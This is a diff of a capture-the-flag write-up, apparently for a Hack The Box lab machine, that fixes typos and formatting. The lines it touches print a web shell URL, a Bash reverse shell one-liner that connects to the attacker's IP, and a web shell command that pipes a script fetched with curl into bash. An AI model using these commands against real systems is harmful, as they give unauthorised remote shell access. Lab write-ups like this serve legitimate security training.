@@ -161,7 +161,7 @@ read the flag
 ```
 http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
 
-and it iwll print
+and it will print
 a980d99281a28d638ac68b9bf9453c2b 
 ```
 
@@ -172,19 +172,20 @@ Direct reverse shell one-liners often fail or get cut off due to URL encoding is
 
 To bypass this restriction, a more reliable **two-stage execution** method can be used:
 
-1. **Stage 1 (Payload Staging):** Create a dedicated Bash reverse shell script locally on the Kali machine.
-2. **Stage 2 (Delivery & Execution):** Force the target host to download the script via the existing web shell and execute it directly in its native terminal environment.
+
+Stage 1 (Payload Staging): Create a dedicated Bash reverse shell script locally on the Kali machine.
+
+Stage 2 (Delivery & Execution): Force the target host to download the script via the existing web shell and execute it directly in its native terminal environment.
+
 ```
 ┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
-└─$ cat shell.sh                                                                                    bash -i >& /dev/tcp/10.10.14.144/4500 0>&1
-
-
+└─$ cat shell.sh
+bash -i >& /dev/tcp/10.10.14.144/4500 0>&1
 
 ┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
-└─$ python -m http.server 80                                                                        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.227.248 - - [25/Oct/2026 21:21:17] "GET /shell.sh HTTP/1.1" 200 -
-
-
 # run the web shell to donwload and run the shell.sh 
 http://thetoppers.htb/shell.php?cmd=curl%20http://10.10.14.144/shell.sh|bash
 
